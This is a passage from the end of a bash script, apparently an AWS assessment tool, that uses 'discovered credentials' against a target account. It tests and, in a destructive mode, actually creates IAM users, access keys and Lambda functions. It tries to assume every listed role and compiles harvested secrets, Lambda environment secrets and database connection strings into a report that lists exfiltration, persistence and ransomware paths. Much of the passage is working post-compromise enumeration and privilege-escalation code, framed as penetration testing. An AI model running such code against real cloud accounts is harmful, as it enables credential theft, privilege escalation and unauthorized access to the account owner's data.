    print_info "Testing specific dangerous actions (using policy simulation)..."
    
    # Test CreateUser - use simulation only (safe)
    echo -n "  iam:CreateUser - "
    if aws iam simulate-principal-policy --policy-source-arn "$current_arn" --action-names "iam:CreateUser" 2>/dev/null | grep -q "allowed"; then
        print_finding "ALLOWED - Can create IAM users!"
        ((privesc_findings++)) || true
    else
        print_error "Denied (simulated)"
    fi
    
    # Test CreateAccessKey - use simulation only (safe)
    echo -n "  iam:CreateAccessKey - "
    if aws iam simulate-principal-policy --policy-source-arn "$current_arn" --action-names "iam:CreateAccessKey" 2>/dev/null | grep -q "allowed"; then
        print_finding "ALLOWED - Can create access keys!"
        ((privesc_findings++)) || true
    else
        print_error "Denied (simulated)"
    fi
    
    # Test PassRole - use simulation only (safe)
    echo -n "  iam:PassRole - "
    if aws iam simulate-principal-policy --policy-source-arn "$current_arn" --action-names "iam:PassRole" 2>/dev/null | grep -q "allowed"; then
        print_finding "ALLOWED - Can pass roles to services!"
        ((privesc_findings++)) || true
    else
        print_error "Denied (simulated)"
    fi
    
    # Test Lambda CreateFunction - use simulation only (safe)
    echo -n "  lambda:CreateFunction - "
    if aws iam simulate-principal-policy --policy-source-arn "$current_arn" --action-names "lambda:CreateFunction" 2>/dev/null | grep -q "allowed"; then
        print_finding "ALLOWED - Can create Lambda functions!"
        ((privesc_findings++)) || true
    else
        print_error "Denied (simulated)"
    fi
    
    #===========================================================================
    # Destructive Tests (only if --test-create is passed)
    #===========================================================================
    if [ "$TEST_DESTRUCTIVE" = true ]; then
        print_warning "Running DESTRUCTIVE tests (--test-create enabled)..."
        print_warning "This will attempt to CREATE resources in the target account!"
        
        # Actually try to create an IAM user
        echo -n "  [DESTRUCTIVE] iam:CreateUser - "
        test_user_name="security-test-DELETEME-$(date +%s)"
        if aws iam create-user --user-name "$test_user_name" 2>&1 | grep -q "User.*created\|already exists"; then
            print_finding "SUCCESS - Created IAM user: $test_user_name"
            print_warning "NOTE: You should delete this user: aws iam delete-user --user-name $test_user_name"
            ((privesc_findings++)) || true
        else
            print_error "Failed to create user"
        fi
        
        # Actually try to create an access key (if we have a username)
        if [ -n "$username" ]; then
            echo -n "  [DESTRUCTIVE] iam:CreateAccessKey (self) - "
            if aws iam create-access-key --user-name "$username" 2>&1 | grep -q "AccessKeyId"; then
                print_finding "SUCCESS - Can create access keys for self!"
                ((privesc_findings++)) || true
            else
                print_error "Failed to create access key"
            fi
        fi
        
        # Try to create a Lambda function (this will likely fail due to missing role, but tests permission)
        echo -n "  [DESTRUCTIVE] lambda:CreateFunction - "
        if aws lambda create-function --function-name "test-DELETEME-$(date +%s)" --runtime python3.9 --role "arn:aws:iam::$ACCOUNT_ID:role/test" --handler "index.handler" --zip-file "fileb:///dev/null" 2>&1 | grep -q "InvalidParameterValue\|ResourceConflict\|created"; then
            print_finding "ALLOWED - Has permission to create Lambda functions!"
            ((privesc_findings++)) || true
        else
            print_error "Failed or denied"
        fi
    else
        print_info "Skipping destructive tests (use --test-create to enable)"
    fi
    
    #===========================================================================
    # Check for Assumable Roles
    #===========================================================================
    print_info "Checking for assumable roles..."
    
    if [ -f "$OUTPUT_DIR/iam_roles.json" ] && [ -s "$OUTPUT_DIR/iam_roles.json" ]; then
        # Look for roles that might be assumable
        assumable_count=0
        
        role_arns=$(jq -r '.Roles[].Arn // empty' "$OUTPUT_DIR/iam_roles.json" 2>/dev/null | head -20)
        if [ -n "$role_arns" ]; then
            while IFS= read -r role_arn; do
                [ -z "$role_arn" ] && continue
                role_name=$(echo "$role_arn" | sed 's/.*:role\///')
                
                # Skip service-linked roles
                [[ "$role_name" == *"ServiceRole"* ]] && continue
                [[ "$role_name" == *"AWSServiceRole"* ]] && continue
                
                echo -n "  Trying to assume $role_name... "
                result=$(aws sts assume-role --role-arn "$role_arn" --role-session-name "SecurityTest" 2>&1) || true
                if [ -n "$result" ] && echo "$result" | grep -q "Credentials"; then
                    print_finding "SUCCESS - Can assume $role_name!"
                    echo "$role_arn" >> "$OUTPUT_DIR/assumable_roles.txt"
                    ((assumable_count++)) || true
                    ((privesc_findings++)) || true
                else
                    print_error "Denied"
                fi
            done <<< "$role_arns"
        fi
        
        if [ $assumable_count -gt 0 ]; then
            print_finding "Can assume $assumable_count roles!"
        fi
    fi
    
    #===========================================================================
    # Check for Cross-Account Access (skip in quick mode)
    #===========================================================================
    if [ "$QUICK_MODE" != true ]; then
        print_info "Checking for cross-account access..."
        
        # Look for roles with cross-account trust
        if [ -f "$OUTPUT_DIR/iam_roles.json" ] && [ -s "$OUTPUT_DIR/iam_roles.json" ]; then
            role_names=$(jq -r '.Roles[].RoleName // empty' "$OUTPUT_DIR/iam_roles.json" 2>/dev/null | head -20)
            if [ -n "$role_names" ]; then
                while IFS= read -r role_name; do
                    [ -z "$role_name" ] && continue
                    trust_policy=$(aws iam get-role --role-name "$role_name" 2>/dev/null | jq '.Role.AssumeRolePolicyDocument' 2>/dev/null) || true
                    
                    [ -z "$trust_policy" ] && continue
                    
                    # Check for cross-account principals
                    if echo "$trust_policy" | grep -q "arn:aws:iam::[0-9]*:"; then
                        other_accounts=$(echo "$trust_policy" | grep -oE "arn:aws:iam::[0-9]+:" | sort -u) || true
                        if [ -n "$other_accounts" ]; then
                            print_warning "Role $role_name has cross-account trust"
                            echo "$role_name: $other_accounts" >> "$OUTPUT_DIR/cross_account_roles.txt"
                        fi
                    fi
                    
                    # Check for wildcard trust (very dangerous)
                    if echo "$trust_policy" | grep -q '"Principal".*"\*"'; then
                        print_finding "Role $role_name trusts EVERYONE (Principal: *)!"
                        echo "$role_name: Principal *" >> "$OUTPUT_DIR/dangerous_roles.txt"
                        ((privesc_findings++)) || true
                    fi
                done <<< "$role_names"
            fi
        fi
    else
        print_info "Skipping cross-account check in quick mode"
    fi
    
    #===========================================================================
    # Check for Resource-Based Policy Weaknesses (skip in quick mode)
    #===========================================================================
    if [ "$QUICK_MODE" != true ]; then
        print_info "Checking for resource-based policy weaknesses..."
        
        # Check Lambda function policies
        if [ -f "$OUTPUT_DIR/lambda_functions.json" ] && [ -s "$OUTPUT_DIR/lambda_functions.json" ]; then
            func_names=$(jq -r '.Functions[:10] | .[].FunctionName // empty' "$OUTPUT_DIR/lambda_functions.json" 2>/dev/null)
            if [ -n "$func_names" ]; then
                while IFS= read -r func_name; do
                    [ -z "$func_name" ] && continue
                    policy=$(aws lambda get-policy --function-name "$func_name" 2>/dev/null) || true
                    if [ -n "$policy" ] && echo "$policy" | grep -q '"Principal".*"\*"'; then
                        print_finding "Lambda $func_name has public access policy!"
                        echo "$func_name" >> "$OUTPUT_DIR/public_lambda_functions.txt"
                        ((privesc_findings++)) || true
                    fi
                done <<< "$func_names"
            fi
        fi
    else
        print_info "Skipping resource policy check in quick mode"
    fi
    
    #===========================================================================
    # Summary
    #===========================================================================
    print_section "PRIVILEGE ESCALATION SUMMARY"
    
    if [ $privesc_findings -gt 0 ]; then
        print_finding "Found $privesc_findings potential privilege escalation paths!"
    else
        print_info "No obvious privilege escalation paths found"
    fi
    
    echo "$privesc_findings" > "$OUTPUT_DIR/privesc_count.txt"
}

generate_report() {
    print_section "GENERATING FINAL REPORT"
    
    REPORT_FILE="$OUTPUT_DIR/security_report.md"
    
    # Count findings across all region files
    s3_count=$(wc -l < "$OUTPUT_DIR/s3_buckets.txt" 2>/dev/null || echo 0)
    
    # Count DynamoDB tables from all region files
    dynamo_count=0
    for f in "$OUTPUT_DIR"/dynamodb_tables*.json; do
        [ -f "$f" ] && count=$(jq '.TableNames | length' "$f" 2>/dev/null || echo 0) && dynamo_count=$((dynamo_count + count))
    done
    
    # Count Lambda functions from all region files
    lambda_count=0
    for f in "$OUTPUT_DIR"/lambda_functions*.json; do
        [ -f "$f" ] && count=$(jq '.Functions | length' "$f" 2>/dev/null || echo 0) && lambda_count=$((lambda_count + count))
    done
    
    # Count Secrets from all region files
    secrets_count=0
    for f in "$OUTPUT_DIR"/secrets_list*.json; do
        [ -f "$f" ] && count=$(jq '.SecretList | length' "$f" 2>/dev/null || echo 0) && secrets_count=$((secrets_count + count))
    done
    
    # Count EC2 instances from all region files
    ec2_count=0
    for f in "$OUTPUT_DIR"/ec2_instances*.json; do
        [ -f "$f" ] && count=$(jq '[.Reservations[].Instances[]] | length' "$f" 2>/dev/null || echo 0) && ec2_count=$((ec2_count + count))
    done
    
    # Count RDS instances from all region files
    rds_count=0
    for f in "$OUTPUT_DIR"/rds_instances*.json; do
        [ -f "$f" ] && count=$(jq '.DBInstances | length' "$f" 2>/dev/null || echo 0) && rds_count=$((rds_count + count))
    done
    
    total_secrets=$(wc -l < "$OUTPUT_DIR/ALL_SECRETS_FOUND.txt" 2>/dev/null || echo 0)
    
    # Count regions tested
    regions_tested="Single region ($AWS_REGION)"
    if [ -f "$OUTPUT_DIR/regions_tested.txt" ]; then
        region_count=$(wc -w < "$OUTPUT_DIR/regions_tested.txt" 2>/dev/null || echo 1)
        regions_tested="Multi-region ($region_count regions)"
    fi
    
    cat > "$REPORT_FILE" << EOF
# AWS Security Assessment Report

**Date:** $(date)  
**Default Region:** $AWS_REGION  
**Regions Tested:** $regions_tested  
**Assessment Type:** Automated Credential & Access Enumeration

---

## Executive Summary

This report documents findings from an automated security assessment of AWS resources using discovered credentials.

### Critical Findings Overview

| Category | Count | Severity |
|----------|-------|----------|
| Exposed Secrets | $total_secrets | 🔴 CRITICAL |
| S3 Buckets Accessible | $s3_count | 🟠 HIGH |
| Lambda Functions (with env vars) | $lambda_count | 🟠 HIGH |
| DynamoDB Tables | $dynamo_count | 🟠 HIGH |
| Secrets Manager Entries | $secrets_count | 🔴 CRITICAL |
| EC2 Instances | $ec2_count | 🟡 MEDIUM |
| RDS Instances | $rds_count | 🟠 HIGH |

---

## Identity Information

The following identity was used for this assessment:

\`\`\`json
$(cat "$OUTPUT_DIR/caller_identity.json" 2>/dev/null || echo "N/A")
\`\`\`

**Credential Type:** $(if [[ "$(cat "$OUTPUT_DIR/caller_identity.json" 2>/dev/null | jq -r '.Arn')" == *"assumed-role"* ]]; then echo "Temporary (STS)"; else echo "Permanent (IAM User)"; fi)

---

## Services Access Matrix

### Compute & Containers
| Service | Access | Count |
|---------|--------|-------|
| Lambda | $([ -f "$OUTPUT_DIR/lambda_functions.json" ] && echo "✅" || echo "❌") | $lambda_count |
| EC2 | $([ -f "$OUTPUT_DIR/ec2_instances.json" ] && echo "✅" || echo "❌") | $ec2_count |
| ECS | $([ -f "$OUTPUT_DIR/ecs_clusters.json" ] && echo "✅" || echo "❌") | $(jq '.clusterArns | length' "$OUTPUT_DIR/ecs_clusters.json" 2>/dev/null || echo 0) |
| EKS | $([ -f "$OUTPUT_DIR/eks_clusters.json" ] && echo "✅" || echo "❌") | $(jq '.clusters | length' "$OUTPUT_DIR/eks_clusters.json" 2>/dev/null || echo 0) |
| Elastic Beanstalk | $([ -f "$OUTPUT_DIR/elasticbeanstalk_apps.json" ] && echo "✅" || echo "❌") | - |

### Databases
| Service | Access | Count |
|---------|--------|-------|
| RDS | $([ -f "$OUTPUT_DIR/rds_instances.json" ] && echo "✅" || echo "❌") | $rds_count |
| DynamoDB | $([ -f "$OUTPUT_DIR/dynamodb_tables.json" ] && echo "✅" || echo "❌") | $dynamo_count |
| ElastiCache | $([ -f "$OUTPUT_DIR/elasticache_clusters.json" ] && echo "✅" || echo "❌") | - |
| Redshift | $([ -f "$OUTPUT_DIR/redshift_clusters.json" ] && echo "✅" || echo "❌") | - |
| DocumentDB | $([ -f "$OUTPUT_DIR/documentdb_clusters.json" ] && echo "✅" || echo "❌") | - |

### Storage
| Service | Access | Count |
|---------|--------|-------|
| S3 | $([ -f "$OUTPUT_DIR/s3_buckets.txt" ] && echo "✅" || echo "❌") | $s3_count |
| EFS | $([ -f "$OUTPUT_DIR/efs_filesystems.json" ] && echo "✅" || echo "❌") | - |
| FSx | $([ -f "$OUTPUT_DIR/fsx_filesystems.json" ] && echo "✅" || echo "❌") | - |

### Security & Secrets
| Service | Access | Count |
|---------|--------|-------|
| Secrets Manager | $([ -f "$OUTPUT_DIR/secrets_list.json" ] && echo "✅" || echo "❌") | $secrets_count |
| SSM Parameters | $([ -f "$OUTPUT_DIR/ssm_parameters.json" ] && echo "✅" || echo "❌") | $(jq '.Parameters | length' "$OUTPUT_DIR/ssm_parameters.json" 2>/dev/null || echo 0) |
| KMS | $([ -f "$OUTPUT_DIR/kms_keys.json" ] && echo "✅" || echo "❌") | - |
| IAM Users | $([ -f "$OUTPUT_DIR/iam_users.json" ] && echo "✅" || echo "❌") | $(jq '.Users | length' "$OUTPUT_DIR/iam_users.json" 2>/dev/null || echo 0) |
| IAM Roles | $([ -f "$OUTPUT_DIR/iam_roles.json" ] && echo "✅" || echo "❌") | $(jq '.Roles | length' "$OUTPUT_DIR/iam_roles.json" 2>/dev/null || echo 0) |

---

## 🚨 Critical Findings

### 1. Exposed Secrets ($total_secrets found)

The following potential secrets were discovered:

\`\`\`
$(head -50 "$OUTPUT_DIR/ALL_SECRETS_FOUND.txt" 2>/dev/null || echo "None found")
\`\`\`

### 2. Lambda Environment Variables with Secrets

\`\`\`
$(head -30 "$OUTPUT_DIR/lambda_secrets.txt" 2>/dev/null || echo "None found")
\`\`\`

### 3. Database Connection Strings

\`\`\`
$(grep -i "connection\|jdbc\|mysql\|postgres\|mongodb" "$OUTPUT_DIR/ALL_SECRETS_FOUND.txt" 2>/dev/null | head -20 || echo "None found")
\`\`\`

### 4. Overly Permissive Security Groups

\`\`\`
$(cat "$OUTPUT_DIR/open_security_groups.txt" 2>/dev/null | head -20 || echo "None found")
\`\`\`

### 5. Public S3 Buckets

\`\`\`
$(cat "$OUTPUT_DIR/s3_public_buckets.txt" 2>/dev/null || echo "None found")
\`\`\`

---

## Detailed Service Enumeration

### S3 Buckets (First 30)
\`\`\`
$(head -30 "$OUTPUT_DIR/s3_buckets.txt" 2>/dev/null || echo "No access")
\`\`\`

### DynamoDB Tables
\`\`\`json
$(jq '.TableNames[:15]' "$OUTPUT_DIR/dynamodb_tables.json" 2>/dev/null || echo "No access")
\`\`\`

### Secrets Manager Entries
\`\`\`json
$(jq '.SecretList[].Name' "$OUTPUT_DIR/secrets_list.json" 2>/dev/null || echo "No access")
\`\`\`

### Lambda Functions (First 20)
\`\`\`
$(jq -r '.Functions[:20] | .[].FunctionName' "$OUTPUT_DIR/lambda_functions.json" 2>/dev/null || echo "No access")
\`\`\`

### EC2 Instances
\`\`\`json
$(jq '.Reservations[].Instances[] | {InstanceId, InstanceType, State: .State.Name, PrivateIp: .PrivateIpAddress}' "$OUTPUT_DIR/ec2_instances.json" 2>/dev/null | head -40 || echo "No access")
\`\`\`

### RDS Instances
\`\`\`json
$(jq '.DBInstances[] | {DBInstanceIdentifier, Engine, Endpoint: .Endpoint.Address}' "$OUTPUT_DIR/rds_instances.json" 2>/dev/null || echo "No access")
\`\`\`

### VPCs
\`\`\`json
$(jq '.Vpcs[] | {VpcId, CidrBlock, IsDefault}' "$OUTPUT_DIR/vpcs.json" 2>/dev/null || echo "No access")
\`\`\`

---

## Attack Vectors Identified

Based on the enumeration, the following attack vectors are possible:

1. **Data Exfiltration**: Access to S3 buckets and databases allows extraction of sensitive data
2. **Lateral Movement**: Database credentials and VPC access enable movement to internal systems
3. **Privilege Escalation**: IAM access may allow assuming higher-privileged roles
4. **Persistence**: Ability to create new resources or modify existing ones
5. **Ransomware**: Write access to S3 and databases could enable encryption attacks

---

## Recommendations

### Immediate Actions (Critical)
1. **Rotate all exposed credentials** - IAM keys, database passwords, API keys
2. **Revoke the compromised IAM user** - Disable \`ClintMcElroyCli\` immediately
3. **Review CloudTrail logs** - Check for unauthorized access using these credentials
4. **Enable MFA** on all IAM users and root account

### Short-Term (High Priority)
5. **Remove hardcoded secrets** from Lambda environment variables - Use Secrets Manager with proper IAM policies
6. **Review Cognito Identity Pool** - Disable unauthenticated access if not required
7. **Implement least privilege** - Restrict IAM policies to minimum required permissions
8. **Enable GuardDuty** - For threat detection
9. **Restrict security groups** - Remove 0.0.0.0/0 ingress rules where not needed

### Long-Term (Best Practices)
10. **Implement SCPs** - Prevent credential exposure at organization level
11. **Enable AWS Config** - Monitor for compliance violations
12. **Use AWS Organizations** - Implement proper account boundaries
13. **Regular security assessments** - Schedule periodic penetration testing
14. **Secrets rotation** - Implement automatic rotation for all secrets

---

## Files Generated

| File | Description |
|------|-------------|
| caller_identity.json | Identity information |
| s3_buckets.txt | List of S3 buckets |
| lambda_functions.json | Lambda functions with env vars |
| ALL_SECRETS_FOUND.txt | Consolidated secrets discovered |
| security_groups.json | Security group configurations |
| *_secrets.txt | Service-specific secrets |

---

## Appendix: All Accessible Files

\`\`\`
$(ls -la "$OUTPUT_DIR" 2>/dev/null)
\`\`\`

---

*Report generated by AWS Security Testing Script*  
*Assessment completed at $(date)*
EOF

    print_success "Report saved to $REPORT_FILE"
    
    # Also generate a quick summary for terminal output
    print_section "QUICK SUMMARY"
    echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  S3 Buckets:        ${GREEN}$s3_count${NC}"
    echo -e "  DynamoDB Tables:   ${GREEN}$dynamo_count${NC}"
    echo -e "  Lambda Functions:  ${GREEN}$lambda_count${NC}"
    echo -e "  Secrets Manager:   ${GREEN}$secrets_count${NC}"
    echo -e "  EC2 Instances:     ${GREEN}$ec2_count${NC}"
    echo -e "  RDS Instances:     ${GREEN}$rds_count${NC}"
    echo -e "  ${RED}SECRETS FOUND:     $total_secrets${NC}"
    echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

#===============================================================================
# Main Execution
#===============================================================================

main() {
    print_banner
    
    # Create output directory
    mkdir -p "$OUTPUT_DIR"
    
    print_info "Output directory: $OUTPUT_DIR"
    print_info "Default region: $AWS_REGION"
    [ "$QUICK_MODE" = true ] && print_warning "Quick mode enabled - some tests will be skipped"
    [ "$MULTI_REGION" = true ] && print_warning "Multi-region mode enabled - testing all AWS regions"
    [ "$SKIP_COGNITO" = true ] && print_info "Skipping Cognito tests"
    [ "$SKIP_PRIVESC" = true ] && print_info "Skipping privilege escalation checks"
    [ "$SKIP_SECRETS" = true ] && print_info "Skipping secret extraction"
    if [ "$TEST_DESTRUCTIVE" = true ]; then
        echo ""
        print_finding "⚠️  DESTRUCTIVE MODE ENABLED ⚠️"
        print_warning "This script will attempt to CREATE resources in the target AWS account!"
        print_warning "Resources created will need to be manually cleaned up."
        echo ""
        read -t 10 -p "Press Enter to continue or Ctrl+C to abort (auto-continues in 10s)... " || true
    fi
    echo ""
    
    # Initialize regions if multi-region mode
    if [ "$MULTI_REGION" = true ]; then
        if [ -n "$CUSTOM_REGIONS" ]; then
            IFS=',' read -ra ALL_REGIONS <<< "$CUSTOM_REGIONS"
            print_info "Testing custom regions: ${ALL_REGIONS[*]}"
        fi
    fi
    
    # Step 1: Try to decode any encoded credentials
    if [ -n "$ENCODED_CREDENTIALS" ]; then
        decode_credentials
    fi
    
    # Step 2: Test Cognito unauthenticated access
    if [ "$SKIP_COGNITO" != true ]; then
        test_cognito_unauth_access || true
    fi
    
    # Step 2b: Cognito User Pool client authentication
    if [ -n "$COGNITO_CLIENT_ID" ]; then
        test_cognito_client_auth || true
    fi
    
    # Step 3: Setup credentials (uses best available)
    if ! setup_credentials; then
        if [ -n "$OAUTH2_ACCESS_TOKEN" ]; then
            print_warning "No IAM credentials available, but Bearer token was obtained"
            print_info "Switching to Bearer token enumeration mode"

            enumerate_with_bearer_token

            print_section "TESTING COMPLETE (BEARER TOKEN MODE)"
            print_success "All results saved to: $OUTPUT_DIR"
            print_info "Key files to review:"
            echo "  - $OUTPUT_DIR/cognito_oauth2_token.json"
            [ -f "$OUTPUT_DIR/jwt_claims.json" ] && echo "  - $OUTPUT_DIR/jwt_claims.json"
            [ -f "$OUTPUT_DIR/cognito_userinfo.json" ] && echo "  - $OUTPUT_DIR/cognito_userinfo.json"
            [ -f "$OUTPUT_DIR/oidc_configuration.json" ] && echo "  - $OUTPUT_DIR/oidc_configuration.json"
            [ -f "$OUTPUT_DIR/cognito_jwks.json" ] && echo "  - $OUTPUT_DIR/cognito_jwks.json"
            [ -f "$OUTPUT_DIR/cognito_user_enum.txt" ] && echo "  - $OUTPUT_DIR/cognito_user_enum.txt"
            [ -f "$OUTPUT_DIR/cognito_signup_probe.json" ] && echo "  - $OUTPUT_DIR/cognito_signup_probe.json"
            [ -f "$OUTPUT_DIR/cognito_client_details.json" ] && echo "  - $OUTPUT_DIR/cognito_client_details.json"
            [ -f "$OUTPUT_DIR/cognito_pool_clients.json" ] && echo "  - $OUTPUT_DIR/cognito_pool_clients.json"
            echo ""
            print_info "No IAM credentials were available for full AWS service enumeration."
            print_info "To also run IAM-based enumeration, provide an Identity Pool (-p) with"
            print_info "--username/--password, or supply IAM keys directly (-a, -s)."
            return 0
        fi

        print_error "No valid credentials available. Exiting."
        print_info "Provide credentials via:"
        print_info "  - Environment variables (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)"
        print_info "  - Command line arguments (-a, -s)"
        print_info "  - Cognito Identity Pool (-p)"
        print_info "  - Cognito client credentials (--client-id, --client-secret, --token-url)"
        print_info "  - Encoded credentials string (-e)"
        exit 1
    fi
    
    # Step 4: Enumerate services
    enumerate_services
    
    # Step 5: Extract sensitive data
    if [ "$SKIP_SECRETS" != true ]; then
        extract_sensitive_data
    else
        print_section "SKIPPING SECRET EXTRACTION"
        print_info "Use --skip-secrets=false to enable"
    fi
    
    # Step 6: Check for privilege escalation
    if [ "$SKIP_PRIVESC" != true ]; then
        check_privilege_escalation || true
    else
        print_section "SKIPPING PRIVILEGE ESCALATION CHECKS"
        print_info "Use --skip-privesc=false to enable"
    fi
    
    # Step 7: Generate report
    generate_report
    
    print_section "TESTING COMPLETE"
    print_success "All results saved to: $OUTPUT_DIR"
    print_info "Review the security_report.md for a summary of findings"
    echo ""
    print_info "Key files to review:"
    echo "  - $OUTPUT_DIR/security_report.md"
    echo "  - $OUTPUT_DIR/ALL_SECRETS_FOUND.txt"
    echo "  - $OUTPUT_DIR/lambda_secrets.txt"
    echo "  - $OUTPUT_DIR/open_security_groups.txt"
}

# Run main function
main "$@"
